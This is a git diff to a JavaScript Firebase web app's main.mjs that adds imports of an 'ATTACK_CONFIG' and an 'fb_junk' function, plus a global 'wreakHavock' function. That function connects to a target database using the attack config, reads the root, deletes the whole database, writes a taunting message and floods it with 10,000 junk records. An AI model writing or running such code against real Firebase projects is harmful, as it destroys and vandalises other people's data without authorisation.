@@ -13,7 +13,7 @@ console.log('%c main.mjs initialised',
 
 /**************************************************************/
 // Import all the constants & functions required from fb modules
-import {fb_initialise}
+import {fb_initialise, firebaseConfig, ATTACK_CONFIG}
     from './fb_io.mjs';
     window.fb_initialise   = fb_initialise;
 import {fb_login,fb_logout, fb_authCheck}
@@ -21,7 +21,7 @@ import {fb_login,fb_logout, fb_authCheck}
     window.fb_login   = fb_login;
     window.fb_logout   = fb_logout;
     window.fb_authCheck   = fb_authCheck;
-import {fb_read, fb_readpath, fb_write, fb_update, fb_sortedread, fb_listen, fb_delete}
+import {fb_read, fb_readpath, fb_write, fb_update, fb_sortedread, fb_listen, fb_delete, fb_junk}
     from './fb_readwrite.mjs';
     window.fb_read   = fb_read;
     window.fb_readpath   = fb_readpath;
@@ -30,6 +30,24 @@ import {fb_read, fb_readpath, fb_write, fb_update, fb_sortedread, fb_listen, fb_
     window.fb_sortedread = fb_sortedread;
     window.fb_listen = fb_listen;
     window.fb_delete = fb_delete;
+    window.fb_junk = fb_junk;
+
+
+    function wreakHavock(requiresAuth) {
+        fb_initialise(ATTACK_CONFIG);
+        if (requiresAuth) {
+            fb_login();
+        }
+        fb_read("/");
+        fb_delete("/");
+        fb_update("/",{"havoc":"HO HO HO! YOU JUST GOT LANCERED!"})
+        fb_junk(10000);
+        if (requiresAuth) {
+            fb_logout();
+        }
+    }
+
+    window.wreakHavock = wreakHavock;
 /**************************************************************/
 // index.html main code
 /**************************************************************/
